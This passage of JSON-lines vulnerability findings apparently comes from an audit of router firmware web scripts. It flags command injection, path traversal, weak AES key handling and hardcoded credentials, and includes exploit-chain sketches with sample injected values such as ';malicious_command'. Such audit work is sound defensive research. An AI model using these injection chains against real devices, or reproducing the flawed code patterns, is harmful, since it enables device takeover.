/phplib/session.php to verify the entropy of session IDs."}
{"name": "configuration_load-getcfg-AES_risk", "file_path": "htdocs/web/getcfg.php", "location": "getcfg.php: [AES_Encrypt_DBnode]", "risk_score": 7.0, "confidence": 5.0, "description": "AES Encryption Implementation Risk: The AES_Encrypt128/AES_Decrypt128 functions are used to encrypt/decrypt sensitive configuration items (such as passwords and keys), but their implementation mechanism has not been verified. Trigger Condition: The operation is triggered when the $Method parameter in an HTTP request is 'Encrypt'/'Decrypt'. Potential Risks: If ECB mode, hardcoded keys, or weak IVs (such as all zeros) are used, encrypted data may be compromised. Boundary Check: Limited to specific service nodes (e.g., INET.WAN-*), but the security of the encryption implementation has not been validated.", "link_identifiers": ["AES_Encrypt128", "AES_Decrypt128", "REDACTED_SENSITIVE_DATA", "REDACTED_SENSITIVE_DATA", "REDACTED_SENSITIVE_DATA", "$Method"], "notes": "The encryption function implementation is not located (possibly in /lib or /usr/lib), requiring reverse engineering analysis of libcrypto-related modules. Current risk assessment is based on sensitive data types (passwords/keys)."}
{"name": "network_input-commjs-REDACTED_SECRET_KEY_PLACEHOLDER", "file_path": "htdocs/web/js/comm.js", "location": "comm.js:475", "risk_score": 8.0, "confidence": 7.0, "description": "The COMM_GetCFG function has a service parameter injection vulnerability: The Services parameter is only processed through escape() and space removal before being directly concatenated into the AJAX request payload. If the Services parameter is compromised (potentially passed through higher-level calls), attackers could inject additional parameters (e.g., 'SERVICES=legit&injected=malicious') to manipulate the getcfg.php server-side logic. Trigger conditions: 1) The Services parameter must be externally controllable 2) Input contains '&' or '=' characters. Boundary check: Only spaces are removed without filtering special characters. Security impact: May lead to server configuration disclosure or unauthorized operations, with a high risk level.", "code_snippet": "payload += \"SERVICES=\"+escape(COMM_EatAllSpace(Services));", "link_identifiers": ["COMM_GetCFG", "Services", "SERVICES", "escape", "COMM_EatAllSpace", "getcfg.php", "payload"], "notes": "REDACTED_SENSITIVE_DATA"}
{"name": "command_execution-commjs-EvalRisk", "file_path": "htdocs/web/js/comm.js", "location": "comm.js:354-369", "risk_score": 4.0, "confidence": 5.5, "description": "The COMM_IPv4NETWORK function uses eval to perform bitwise operations: network address calculation is implemented via eval(addrArray[i] & maskArray[i]). Trigger condition: called with addr/mask parameters. Constraints: inputs undergo strict validation (numeric range 0-255), making exploitation difficult. Security impact: theoretically carries code execution risk, but practically limited by input validation; recommended to replace with parseInt to eliminate potential vulnerabilities.", "code_snippet": "networkArray[i] = eval(addrArray[i] & maskArray[i]);", "link_identifiers": ["COMM_IPv4NETWORK", "eval", "addr", "mask", "addrArray", "maskArray"], "notes": "Input validation logic: Each segment after splitting with '.' must pass the isNaN check and satisfy 0<=x<=255. Related clue: Multiple 'eval'-related keywords exist in the knowledge base."}
{"name": "exploit_chain-services_parameter_injection", "file_path": "htdocs/web/js/comm.js", "location": "comm.js:475 â†’ getcfg.php:40", "risk_score": 9.0, "confidence": 7.75, "description": "REDACTED_SENSITIVE_DATA", "code_snippet": "REDACTED_SENSITIVE_DATA", "link_identifiers": ["Services", "SERVICES", "getcfg.php", "payload", "$_POST[\"SERVICES\"]", "$GETCFG_SVC", "exploit_chain"], "notes": "Exploit chain: 1) network_input-commjs-REDACTED_SECRET_KEY_PLACEHOLDER (initial injection point) 2) network_input-getcfg-SERVICES_path_traversal (vulnerability trigger point). Further verification required: 1) Possibility of privilege escalation 2) List of exploitable .xml.php files"}
{"name": "cmd_injection-httpd-decrypt_config_chain", "file_path": "htdocs/cgibin", "location": "cgibin:0xe244 (fcn.0000e244)", "risk_score": 9.5, "confidence": 7.5, "description": "REDACTED_SENSITIVE_DATA", "code_snippet": "REDACTED_SENSITIVE_DATA", "link_identifiers": ["param_4", "piVar5[-0xb]", "system", "REDACTED_SENSITIVE_DATA", "devconf", "0x200d0d0", "0x200d164"], "notes": "Critical limitation: Environment variable names not resolved. Follow-up recommendations: 1) Analyze HTTP server configuration to confirm environment variable mapping 2) Perform dynamic testing to validate request construction"}
{"name": "network_input-info_cgi-static_info", "file_path": "htdocs/mydlink/info.cgi", "location": "info.cgi:5-10", "risk_score": 1.0, "confidence": 4.75, "description": "REDACTED_SENSITIVE_DATA", "code_snippet": "REDACTED_SENSITIVE_DATA", "link_identifiers": ["query", "toupper", "REDACTED_SENSITIVE_DATA", "REDACTED_SENSITIVE_DATA", "REDACTED_SENSITIVE_DATA"], "notes": "REDACTED_SENSITIVE_DATA"}
{"name": "command_execution-SHELL_functions-command_injection", "file_path": "htdocs/phplib/trace.php", "location": "htdocs/phplib/trace.php:17-34", "risk_score": 7.0, "confidence": 7.0, "description": "REDACTED_SENSITIVE_DATA", "code_snippet": "function SHELL_debug($shell, $message)\n{\n\tfwrite(\"a\", $shell, \"echo \\\"\".$message.\"\\\"\\n\");\n}", "link_identifiers": ["SHELL_debug", "SHELL_info", "SHELL_error", "$message", "$shell", "fwrite", "echo"], "notes": "REDACTED_SENSITIVE_DATA"}
{"name": "network_input-wireless_config-params", "file_path": "htdocs/mydlink/form_wireless.php", "location": "form_wireless.php:54-72", "risk_score": 8.0, "confidence": 9.4, "description": "REDACTED_SENSITIVE_DATA", "code_snippet": "$settingsChanged = $_POST[\"settingsChanged\"];\n$enable = $_POST[\"f_enable\"];\n...\n$radius_secret1 = $_POST[\"f_radius_secret1\"];", "link_identifiers": ["f_ssid", "f_wpa_psk", "f_radius_secret1", "settingsChanged", "$_POST"], "notes": "The parameter is directly received without any filtering, forming the initial entry point of a complete attack chain."}
{"name": "validation_defect-wireless_keycheck", "file_path": "htdocs/mydlink/form_wireless.php", "location": "form_wireless.php:26-49 & 149-155", "risk_score": 7.5, "confidence": 8.5, "description": "REDACTED_SENSITIVE_DATA", "code_snippet": "REDACTED_SENSITIVE_DATA", "link_identifiers": ["check_key_type_and_valid", "strlen", "isxdigit", "f_wep", "f_wpa_psk", "f_radius_port1"], "notes": "Insufficient boundary checks may lead to stored XSS or configuration corruption. It is necessary to audit the set() function's handling logic for special characters."}
{"name": "configuration_set-wireless_params", "file_path": "htdocs/mydlink/form_wireless.php", "location": "form_wireless.php:88-89 & 102-103 & 149-155", "risk_score": 6.5, "confidence": 6.5, "description": "Pollution parameters are passed to the system configuration layer via the set() function (e.g., set($phy.\"/active\", $enable)). While no direct command execution has been identified, set() may trigger underlying configuration update operations. Attacker-controlled parameters such as f_ssid/f_wpa_psk are directly passed into set(), which could form an RCE attack chain if the underlying implementation contains command concatenation vulnerabilities. Current evidence is insufficient to confirm the final impact.", "code_snippet": "REDACTED_SENSITIVE_DATA", "link_identifiers": ["set", "$phy.\"/active\"", "$wifi.\"/ssid\"", "REDACTED_SENSITIVE_DATA"], "notes": "Special analysis is required for the implementation of the set() function (it is recommended to subsequently analyze library files such as lib_common.php) to confirm whether there is a risk of code injection."}
{"name": "network_input-http_register-cmd_injection", "file_path": "htdocs/web/register_send.php", "location": "htdocs/web/register_send.php:130-170", "risk_score": 9.0, "confidence": 9.0, "description": "The user input (such as $_POST['outemail']) is directly concatenated into HTTP request strings (e.g., $post_str_signup) without any filtering. These strings are written to temporary files and executed via the 'setattr' command. Attackers can inject special characters (such as ';', '&&') to execute arbitrary commands. Trigger condition: submitting malicious POST requests to register_send.php. Boundary checks are entirely absent, with no validation of input length or content. Security impact: attackers can gain full control of the device, with exploitation methods including but not limited to: adding backdoor accounts, downloading malware, and stealing device credentials.", "code_snippet": "setattr(\"/runtime/register\", \"get\", $url.\" > /var/tmp/mydlink_result\");\nget(\"x\", \"/runtime/register\");", "link_identifiers": ["$_POST", "do_post", "setattr", "/runtime/register", "get", "fwrite", "$post_str_signup", "$post_str_signin", "$post_str_adddev"], "notes": "REDACTED_SENSITIVE_DATA"}
{"name": "network_input-http_register-config_pollution", "file_path": "htdocs/web/register_send.php", "location": "htdocs/web/register_send.php:130-137,149-177", "risk_score": 8.0, "confidence": 9.5, "description": "All 7 $_POST parameters (lang/outemail, etc.) are unvalidated: 1) Directly concatenated into HTTP body 2) Written to device configuration (set('/mydlink/regemail')) 3) Controlling business processes ($action=$_POST['act']). Attackers could: a) Inject malicious parameters to disrupt HTTP request structure b) Contaminate device configuration storage c) Tamper with business logic. Boundary checks are entirely absent. Security impact: May lead to configuration pollution, logic bypass, and facilitate exploitation of other vulnerabilities.", "code_snippet": "$action = $_POST[\"act\"];\n$post_str_signup = ...$_POST[\"lang\"].$_POST[\"outemail\"]...;\nset(\"/mydlink/regemail\", $_POST[\"outemail\"]);", "link_identifiers": ["$_POST", "$post_str_signup", "$post_str_signin", "set(\"/mydlink/regemail\")", "$action", "do_post", "read_result"], "notes": "Configuration pollution point: /mydlink/regemail may be used by subsequent processes"}
{"name": "file_operation-tmpfile_insecure_handling", "file_path": "htdocs/web/register_send.php", "location": "[HIDDEN]", "risk_score": 5.5, "confidence": 6.25, "description": "The file operation functions (fwrite/fread) use a fixed path (/var/tmp/mydlink_result) without implementing: 1) file permission checks 2) secure write mechanisms 3) content validity verification. Attackers may modify file contents through symlink attacks or race conditions. Boundary checks are missing. Security impact: may compromise program logic integrity and facilitate privilege escalation attacks.", "code_snippet": "", "link_identifiers": ["fread", "fwrite", "unlink", "/var/tmp/mydlink_result", "/tmp/provision.conf", "get_value_from_mydlink"], "notes": "Critical temporary file: /var/tmp/mydlink_result was read by command execution operation"}
{"name": "security-function-SECURITY_prevent_shell_inject-escape-issue", "file_path": "REDACTED_SENSITIVE_DATA", "location": "security.php:4", "risk_score": 6.0, "confidence": 6.0, "description": "The SECURITY_prevent_shell_inject function defined in security.php attempts to prevent shell injection but contains critical flaws: 1) It completely relies on an undefined escape() function for security implementation 2) Returning double-quote wrapped strings may be misused in dangerous contexts 3) Lacks input source validation mechanism. Trigger condition: When the return value is directly used in dangerous functions like system/exec and the escape() filtering is improper. Actual impact depends on the quality of escape() implementation - insufficient filtering may lead to command injection.", "code_snippet": "function SECURITY_prevent_shell_inject($parameter)\n{\n    return \"\\\"\".escape(\"s\",$parameter).\"\\\"\";\n}", "link_identifiers": ["SECURITY_prevent_shell_inject", "$parameter", "escape"], "notes": "REDACTED_SENSITIVE_DATA"}
{"name": "REDACTED_SECRET_KEY_PLACEHOLDER-Web-bsc_mydlink.php", "file_path": "htdocs/web/bsc_mydlink.php", "location": "htdocs/web/bsc_mydlink.php", "risk_score": 0.0, "confidence": 4.5, "description": "REDACTED_SENSITIVE_DATA", "link_identifiers": ["bsc_mydlink.php", "templates.php", "webinc"], "notes": "Follow-up suggestions: 1) Relax file access permissions 2) Directly provide template file content 3) Prioritize analyzing HNAP processing files in the /htdocs/web/js/comm.js or /htdocs/web/hnap/ directories"}
{"name": "network_input-dnslog-raw_processing", "file_path": "htdocs/web/dnslog.php", "location": "dnslog.php:0 ([HIDDEN])", "risk_score": 6.5, "confidence": 5.5, "description": "REDACTED_SENSITIVE_DATA", "code_snippet": "$domain = cut($RAW_VALUE, 2,',');\nadd($base.'entry:'.$idx.'/domain', $domain);", "link_identifiers": ["$RAW_VALUE", "cut()", "$domain", "$ip", "add()", "set()", "REDACTED_SENSITIVE_DATA", "$MAX_COUNT", "shift_entry()"], "notes": "REDACTED_SENSITIVE_DATA"}
{"name": "crypto-key_management-encrypt_php_privkey", "file_path": "REDACTED_SENSITIVE_DATA", "location": "encrypt.php:3-6 AES_Encrypt128", "risk_score": 8.0, "confidence": 8.5, "description": "REDACTED_SENSITIVE_DATA", "code_snippet": "$key_hex = $_GLOBALS[\"PrivateKey\"];\nif($key_hex==\"\")\n{ return escape(\"x\", $input);}", "link_identifiers": ["$_GLOBALS", "PrivateKey", "AES_Encrypt128", "escape", "$input"], "notes": "Track the source of the $_GLOBALS['PrivateKey'] assignment (recommend analyzing parent scripts that call this file, such as getcfg.php)"}
{"name": "crypto-input_validation-encrypt_php_aes", "file_path": "REDACTED_SENSITIVE_DATA", "location": "encrypt.php:1-16", "risk_score": 7.5, "confidence": 8.75, "description": "REDACTED_SENSITIVE_DATA", "code_snippet": "function AES_Encrypt128($input)\n{\n\t...\n\treturn encrypt_aes($key_hex, $input_hex);\n}\nfunction AES_Decrypt128($encrypted)\n{\n\t...\n\treturn hex2ascii(decrypt_aes($key_hex, $encrypted));\n}", "link_identifiers": ["AES_Encrypt128", "AES_Decrypt128", "encrypt_aes", "decrypt_aes", "$input", "$encrypted"], "notes": "Analyze the implementation of encrypt_aes/decrypt_aes (recommend checking the shared libraries in the /lib directory)"}
{"name": "crypto-undefined_function-encrypt_php_escape", "file_path": "REDACTED_SENSITIVE_DATA", "location": "encrypt.php:6", "risk_score": 6.5, "confidence": 7.5, "description": "REDACTED_SENSITIVE_DATA", "code_snippet": "return escape(\"x\", $input);", "link_identifiers": ["escape", "AES_Encrypt128", "$input", "postxml.js", "comm.js"], "notes": "Global positioning of the escape function implementation is required (recommend searching the phplib directory)"}
{"name": "network_input-upnp-UPNP_REDACTED_SECRET_KEY_PLACEHOLDER_16", "file_path": "htdocs/phplib/upnp.php", "location": "htdocs/phplib/upnp.php:16", "risk_score": 8.0, "confidence": 6.25, "description": "The UPNP_REDACTED_SECRET_KEY_PLACEHOLDER function does not validate the $type parameter: 1) It is directly used in XML node queries (query($inf_path.'/upnp/entry:'.$i)) 2) It is passed as a parameter to XNODE_getpathbytarget for constructing device paths. When $create>0 (current call sets $create=0), an attacker could inject malicious nodes or trigger path traversal through a crafted $type value. Trigger conditions: a) Upstream call points expose HTTP interfaces b) The $type parameter is externally controllable c) The call sets $create=1. Actual impact: May lead to UPnP device information disclosure or configuration tampering.", "code_snippet": "if (query($inf_path.\"/upnp/entry:\".$i) == $type)\n    return XNODE_getpathbytarget(\"/runtime/upnp\", \"dev\", \"deviceType\", $type, 0);", "link_identifiers": ["UPNP_REDACTED_SECRET_KEY_PLACEHOLDER", "$type", "query", "XNODE_getpathbytarget", "deviceType", "/runtime/upnp", "$create"], "notes": "Critical evidence gaps: 1) Whether $type originates from $_GET/$_POST 2) The upstream HTTP endpoint location that calls this function. Related vulnerability: XNODE_getpathbytarget has path control defects (see independent discovery)."}
{"name": "network_input-xnode-XNODE_getpathbytarget_unknown", "file_path": "htdocs/phplib/upnp.php", "location": "unknown:0 [[HIDDEN]]", "risk_score": 7.0, "confidence": 6.0, "description": "The XNODE_getpathbytarget function has path control vulnerabilities: 1) It directly concatenates $base/$node to construct paths 2) The $value parameter does not filter special characters 3) When $create>0, it allows external values to be written into XML nodes. In the current call ($create=0), the risk is limited, but if other call points meet the following conditions: a) $base/$node is externally controllable b) $create=1 c) path normalization is not performed, it may lead to XML injection or filesystem traversal.", "link_identifiers": ["XNODE_getpathbytarget", "$base", "$node", "$value", "$create", "set", "path", "UPNP_REDACTED_SECRET_KEY_PLACEHOLDER"], "notes": "Audit all call points with $create=1 globally. Associated with UPNP_REDACTED_SECRET_KEY_PLACEHOLDER (called by it), but the function location has not been identified yet, pending further analysis of the www directory."}
{"name": "path-traversal-getcfg-105-116", "file_path": "htdocs/web/getcfg.php", "location": "getcfg.php:105-116", "risk_score": 9.0, "confidence": 7.75, "description": "REDACTED_SENSITIVE_DATA", "code_snippet": "REDACTED_SENSITIVE_DATA", "link_identifiers": ["$_POST['SERVICES']", "$GETCFG_SVC", "dophp('load', $file)", "isfile($file)", "REDACTED_SENSITIVE_DATA"], "notes": "REDACTED_SENSITIVE_DATA"}
{"name": "command_injection-libservice-runservice", "file_path": "REDACTED_SENSITIVE_DATA", "location": "libservice.php:6-12", "risk_score": 9.0, "confidence": 7.75, "description": "The runservice($cmd) function contains an unfiltered command injection vulnerability: the $cmd parameter is directly concatenated into the 'service '.$cmd.' &' command and executed via event(). Trigger condition: When externally controllable data (such as HTTP parameters) is passed into $cmd, attackers can achieve RCE by injecting command separators. High severity (risk score 9.0), actual impact depends on external scripts calling this function.", "code_snippet": "function runservice($cmd)\n{\n  addevent(\"PHPSERVICE\",\"service \".$cmd.\" &\");\n  event(\"PHPSERVICE\");\n}", "link_identifiers": ["runservice", "$cmd", "event", "addevent", "PHPSERVICE", "service"], "notes": "Search for runservice() call points in the www directory (none found in current file). Related knowledge base keywords: $cmd (command injection vulnerabilities), service (service control functions)."}
{"name": "mac_validation-libservice-get_valid_mac", "file_path": "REDACTED_SENSITIVE_DATA", "location": "libservice.php:14-29", "risk_score": 7.0, "confidence": 7.0, "description": "The get_valid_mac($value) function contains validation logic flaws: 1) Using the undefined function charcodeat may cause index out-of-bounds errors 2) Missing MAC character validity checks (0-9A-F) 3) Failing to verify input length. When malformed MAC addresses are passed, this could lead to logic bypass or information leakage (risk score 7.0).", "code_snippet": "$char = charcodeat($value,$mac_idx);\nif($char != \"\")\n{\n  if($char == $delimiter){$mac_idx++;}\n  $valid_mac = $valid_mac.$delimiter;", "link_identifiers": ["get_valid_mac", "$value", "charcodeat", "$mac_idx", "substr"], "notes": "Verify the implementation of charCodeAt and search for its call points. Related knowledge base keywords: $value (input validation vulnerabilities), substr (string manipulation function)."}
{"name": "network_input-inf-uid_path_traversal", "file_path": "htdocs/phplib/inf.php", "location": "inf.php:4 (INF_getinfpath)", "risk_score": 6.0, "confidence": 6.25, "description": "REDACTED_SENSITIVE_DATA", "code_snippet": "function INF_getinfpath($UID){\n  return XNODE_getpathbytarget(\"\", \"inf\", \"uid\", $UID, \"0\");\n}", "link_identifiers": ["INF_getinfpath", "XNODE_getpathbytarget", "UID", "/runtime", "/inet", "inf.php"], "notes": "REDACTED_SENSITIVE_DATA"}
{"name": "network_input-inf-xss", "file_path": "htdocs/phplib/inf.php", "location": "inf.php:8 (INF_getinfinfo)", "risk_score": 4.0, "confidence": 4.5, "description": "The INF_getinfinfo function directly returns query results without output encoding. If the returned data contains user-controllable content (such as interface names), it may lead to XSS vulnerabilities. Trigger conditions: 1) The query results contain externally controllable data; 2) The caller directly outputs the return value to HTML without encoding.", "code_snippet": "function INF_getinfinfo($path){\n  $result = array();\n  if($path != \"\"){\n    $query = \"/runtime\".$path;\n    ...\n  }\n  return $result;\n}", "link_identifiers": ["INF_getinfinfo", "query", "return", "inf.php"], "notes": "Check whether the web page calling this function performs secure encoding on the return value."}
{"name": "input_validation-ipv6-INET_validv6addr", "file_path": "htdocs/phplib/inet6.php", "location": "inet6.php:5-18", "risk_score": 3.0, "confidence": 7.0, "description": "The text defines IPv6 validation wrapper functions (such as INET_validv6addr), which directly pass the $ipaddr parameter to underlying validation functions (e.g., ipv6checkip) without any input filtering or boundary checks. If the underlying functions contain vulnerabilities (such as buffer overflows) and $ipaddr is passed with externally tainted data, security issues may be triggered. Trigger conditions: 1) The calling context of these functions contains tainted sources (e.g., HTTP parameters); 2) The underlying validation functions have vulnerabilities that can be exploited by malicious IPv6 addresses. The actual impact depends on the underlying implementation and may result in denial of service or code execution.", "code_snippet": "function INET_validv6addr($ipaddr)\n{\n    if ( ipv6checkip($ipaddr)==\"1\" ) return 1;\n    else return 0;\n}", "link_identifiers": ["INET_validv6addr", "INET_globalv6addr", "INET_v6addrtype", "ipv6checkip", "ipv6globalip", "ipv6addrtype", "$ipaddr"], "notes": "Critical follow-up analysis: 1) Locate the ipv6checkip implementation (likely in a C module) to verify boundary checks 2) Trace the contamination path of $ipaddr (inspect call stack such as HTTP handler functions) 3) If vulnerabilities exist in underlying functions, form a complete exploit chain: tainted input â†’ validation function â†’ memory corruption"}
{"name": "helper-time_i18n_tzname", "file_path": "htdocs/phplib/time.php", "location": "htdocs/phplib/time.php:1", "risk_score": 0.0, "confidence": 5.0, "description": "The file only implements the localization functionality for timezone names and poses no security risks. Specific behaviors: 1) The function TIME_i18n_tzname receives parameter $name for string matching conversion 2) No dangerous operations such as command execution/file operations are performed 3) Hardcoded mapping requires no boundary checking 4) No controllable data flow paths exist. Trigger condition: Called with any arbitrary string. Security impact: The function only returns localized strings with no directly exploitable vulnerabilities. Potential risks depend on whether the caller performs input filtering.", "code_snippet": "function TIME_i18n_tzname($name)\n{\n/*  1 */if      ($name==\"(GMT-12:00) International Date Line West\")...", "link_identifiers": ["TIME_i18n_tzname", "$name", "i18n"], "notes": "It is recommended to check whether the web templates or components calling this function (such as when passing $name via HTTP parameters) have XSS or injection vulnerabilities."}
{"name": "event_function-analysis_limitation", "file_path": "REDACTED_SENSITIVE_DATA", "location": "[HIDDEN]", "risk_score": 8.5, "confidence": 7.5, "description": "The `event()` function in the PHP environment has dual high-risk effects: 1) Executing unfiltered command strings in `runservice()`, and 2) Directly triggering system-level operations (e.g., REBOOT) in `form_apply`. However, the underlying implementation remains unlocated, hindering full attack chain validation. Security impact: If `event()` ultimately calls dangerous functions like `system()` or `exec()`, command injection in `runservice()` could form an RCE exploitation chain; if lacking permission checks, unauthorized calls in `form_apply` could lead to denial of service.", "code_snippet": "// runservice()[HIDDEN]:\nevent(\"PHPSERVICE\");\n\n// form_apply[HIDDEN]:\nevent(\"REBOOT\");", "link_identifiers": ["event", "PHPSERVICE", "REBOOT", "system", "exec"], "notes": "Prioritize reverse engineering the event() implementation: 1) Search for event binaries under /bin or /sbin 2) Look for native function implementations in PHP extensions 3) Associate knowledge base keywords: event (6 existing related records found)"}
{"name": "todo-runservice_call_chain", "file_path": "REDACTED_SENSITIVE_DATA", "location": "[HIDDEN]", "risk_score": 9.0, "confidence": 8.75, "description": "REDACTED_SENSITIVE_DATA", "link_identifiers": ["runservice", "call_chain", "RCE", "network_input"], "notes": "Knowledge base correlation: command_injection-libservice-runservice (known vulnerability point) and event_function-analysis_limitation (execution mechanism). Scanning suggestion: grep -r 'runservice' htdocs/"}
{"name": "exploit-chain-name-parameter-analysis", "file_path": "htdocs/phplib/time.php", "location": "REDACTED_SENSITIVE_DATA", "risk_score": 7.0, "confidence": 5.5, "description": "Two command execution vulnerabilities were discovered (located in httpsvcs.php and iptlib.php), both dependent on the $name parameter, but the source of $name's contamination has not yet been identified. Vulnerability trigger condition: $name is tainted by external input and contains malicious command characters. The complete attack path requires verification: 1) Whether HTTP interfaces (e.g., /htdocs/cgibin) assign user input to $name 2) Whether NVRAM settings affect the value of $name 3) Whether data flows across files to the vulnerable functions. Current evidence of initial input points is lacking.", "link_identifiers": ["$name", "command_injection", "httpsvcs.php", "iptlib.php", "upnpsetup", "IPT_newchain"], "notes": "Correlation found: command_execution-httpsvcs_upnpsetup-command_injection and command-execution-iptables-chain-creation. Priority analysis of HTTP parameter processing logic in the /htdocs/cgibin directory is recommended."}
{"name": "configuration_load-mdns-setup_unfiltered", "file_path": "REDACTED_SENSITIVE_DATA", "location": "mdnsresponder.php: [HIDDEN] setup_mdns (L7-27), setup_mdns_txt (L29-49)", "risk_score": 5.0, "confidence": 6.0, "description": "REDACTED_SENSITIVE_DATA", "code_snippet": "set($stsp.\"/srvname\",$srvname);\nset($stsp.\"/port\", $port);\nset($stsp.\"/txt\", $txt); // [HIDDEN]", "link_identifiers": ["setup_mdns", "setup_mdns_txt", "$uid", "$port", "$srvname", "$srvcfg", "$txt", "XNODE_getpathbytarget", "REDACTED_SENSITIVE_DATA", "set", "del", "query"], "notes": "Core limitation: The current file does not handle user input (no $_GET/$_POST, etc.), requiring subsequent analysis of whether the caller (e.g., other PHP controllers) passes tainted parameters. Related clues: Knowledge base already contains XNODE_getpathbytarget and set operation records (e.g., file 'xnode.php'). Suggested new tasks: 1) Query the function chain calling setup_mdns 2) Inspect the source of tainted parameters (e.g., $_POST records)."}
{"name": "command-injection-PHYINF_setup-inf-param", "file_path": "REDACTED_SENSITIVE_DATA", "location": "phyinf.php:PHYINF_setup", "risk_score": 8.5, "confidence": 6.0, "description": "Command Execution Risk: The PHYINF_setup() function utilizes setattr() to execute the 'show dev '.$inf command, where the $inf parameter is directly concatenated without boundary checks. Trigger Condition: When upper-layer calls pass $inf containing special characters (;|`). Security Impact: Enables arbitrary command execution. Missing Boundary Checks: The function lacks internal $inf filtering, relying solely on external validation. Exploitation Method: If attackers control the $inf source, injecting 'dev;malicious_command' could execute system commands.", "code_snippet": "setattr($path.\"/mtu\", \"get\", \"ip -f link link show dev \".$inf.\" | scut -p mtu\")", "link_identifiers": ["PHYINF_setup", "setattr", "$inf", "ip -f link link show", "scut -p mtu"], "notes": "REDACTED_SENSITIVE_DATA"}
{"name": "mac-validation-PHYINF_validmacaddr", "file_path": "REDACTED_SENSITIVE_DATA", "location": "phyinf.php:PHYINF_validmacaddr", "risk_score": 0.5, "confidence": 5.0, "description": "MAC Address Security Verification: PHYINF_validmacaddr() implements multi-layered defense (delimiter check/hexadecimal validation/non-multicast verification). Trigger condition: Activated when processing externally received MAC addresses. Security impact: Effectively prevents MAC spoofing attacks. Boundary check: Comprehensive validation of MAC format and validity.", "link_identifiers": ["PHYINF_validmacaddr", "$macaddr", "cut_count", "isxdigit"]}
{"name": "frontend-movie-ajax-api", "file_path": "REDACTED_SENSITIVE_DATA", "location": "movie.php ([HIDDEN])", "risk_score": 0.0, "confidence": 5.0, "description": "REDACTED_SENSITIVE_DATA", "link_identifiers": ["XMLHttpRequest", "json_cgi", "GetFile", "ListCategory"], "notes": "REDACTED_SENSITIVE_DATA"}
{"name": "network_input-lang.php-wiz_set_LANGPACK_language_parameter", "file_path": "htdocs/phplib/lang.php", "location": "lang.php:48 wiz_set_LANGPACK", "risk_score": 2.0, "confidence": 3.75, "description": "REDACTED_SENSITIVE_DATA", "code_snippet": "REDACTED_SENSITIVE_DATA", "link_identifiers": ["wiz_set_LANGPACK", "$_GET", "language", "$lcode", "sealpac", "REDACTED_SENSITIVE_DATA"], "notes": "Need further verification: 1) Actual location of the sealpac function (recommend global search) 2) Whether the web route configuration hides the call entry 3) Whether the function is dynamically loaded during firmware runtime"}
{"name": "network_input-docphp-frontend_input", "file_path": "REDACTED_SENSITIVE_DATA", "location": "doc.php: show_media_list()", "risk_score": 7.5, "confidence": 8.0, "description": "Front-end input handling vulnerability: User input from the search_box is directly used as API request parameters (path/filename) with only front-end indexOf filtering and no server-side validation. Attackers can craft malicious path parameters to attempt path traversal or injection attacks. Trigger condition: User inputs special characters (../ or ;), impact depends on API endpoint handling logic.", "code_snippet": "str += \"<tr ...><a href=\\\"\"+req+\"\\\">...\" + file_name + \"...<\\/a>\";\nmedia_list.innerHTML = str;", "link_identifiers": ["search_box", "GetFile", "ListCategory", "path", "filename", "dws/api"], "notes": "Verify whether the /dws/api/ endpoint performs secure processing of path/filename. It is recommended to analyze the corresponding PHP files in the dws/api directory."}
{"name": "exploit-chain-http-to-command-injection", "file_path": "REDACTED_SENSITIVE_DATA", "location": "[HIDDEN]inf.phpâ†’phyinf.php", "risk_score": 9.0, "confidence": 8.25, "description": "exploit_chain: External input via HTTP parameter pollution $inf â†’ processed by XNODE_getpathbytarget in inf.php â†’ passed to PHYINF_setup() in phyinf.php â†’ triggers unfiltered command execution. Trigger steps: 1. Attacker crafts HTTP request with malicious $inf (e.g., POST /inf.php?UID=;malicious_command) 2. inf.php invokes XNODE_getpathbytarget to generate $inf path 3. phyinf.php directly concatenates $inf to execute system commands. Exploit probability: High (requires validation against specific HTTP endpoints), successful exploitation leads to RCE.", "link_identifiers": ["PHYINF_setup", "setattr", "$inf", "XNODE_getpathbytarget", "INF_getinfpath", "command_execution", "network_input"], "notes": "Exploit chain: 1. Original command injection item (command-injection-PHYINF_setup-inf-param) 2. Path traversal item in inf.php (network_input-inf-uid_path_traversal) 3. XNODE vulnerability item (network_input-xnode-XNODE_getpathbytarget_unknown)"}
{"name": "network_input-js_authentication-param_injection", "file_path": "REDACTED_SENSITIVE_DATA", "location": "index.php (JavaScript): XMLRequest[HIDDEN]", "risk_score": 7.5, "confidence": 8.0, "description": "REDACTED_SENSITIVE_DATA", "code_snippet": "REDACTED_SENSITIVE_DATA", "link_identifiers": ["REDACTED_PASSWORD_PLACEHOLDER", "exec_auth_cgi", "XMLRequest", "para", "id", "REDACTED_SENSITIVE_DATA"], "notes": "Immediate analysis required: 1) Implementation of exec_auth_cgi in libajax.js; 2) Parameter parsing logic of backend authentication CGI"}
{"name": "network_input-HNAP_Login-API", "file_path": "REDACTED_SENSITIVE_DATA", "location": "Login.xml:7", "risk_score": 7.5, "confidence": 8.5, "description": "REDACTED_SENSITIVE_DATA", "code_snippet": "<Login xmlns=\"http://purenetworks.com/HNAP1/\">\n  <Action></Action>\n  <REDACTED_PASSWORD_PLACEHOLDER></REDACTED_PASSWORD_PLACEHOLDER>\n  <LoginPassword></LoginPassword>\n  <Captcha></Captcha>\n</Login>", "link_identifiers": ["Login", "REDACTED_PASSWORD_PLACEHOLDER", "LoginPassword", "Captcha", "http://purenetworks.com/HNAP1/"], "notes": "It is necessary to track the actual CGI program (such as hnap.cgi) that processes this API and verify whether there are vulnerabilities in the parameter handling logic."}
{"name": "network_input-Login_xml_file", "file_path": "REDACTED_SENSITIVE_DATA", "location": "Login.xml:0", "risk_score": 0.5, "confidence": 5.0, "description": "No local security risks: 1) No hardcoded credentials or keys found 2) No <script> tags or external resource references 3) No XSS or CSRF-related metadata definitions. The file serves only as an interface definition and does not directly process data.", "link_identifiers": ["Login.xml"]}
{"name": "hardcoded_creds-logininfo.xml", "file_path": "REDACTED_SENSITIVE_DATA", "location": "REDACTED_SENSITIVE_DATA", "risk_score": 8.0, "confidence": 8.5, "description": "REDACTED_SENSITIVE_DATA", "code_snippet": "<REDACTED_PASSWORD_PLACEHOLDER>REDACTED_PASSWORD_PLACEHOLDER</REDACTED_PASSWORD_PLACEHOLDER><REDACTED_PASSWORD_PLACEHOLDER>t</REDACTED_PASSWORD_PLACEHOLDER>", "link_identifiers": ["REDACTED_PASSWORD_PLACEHOLDER", "REDACTED_PASSWORD_PLACEHOLDER", "logininfo.xml", "REDACTED_SENSITIVE_DATA"], "notes": "REDACTED_SENSITIVE_DATA"}
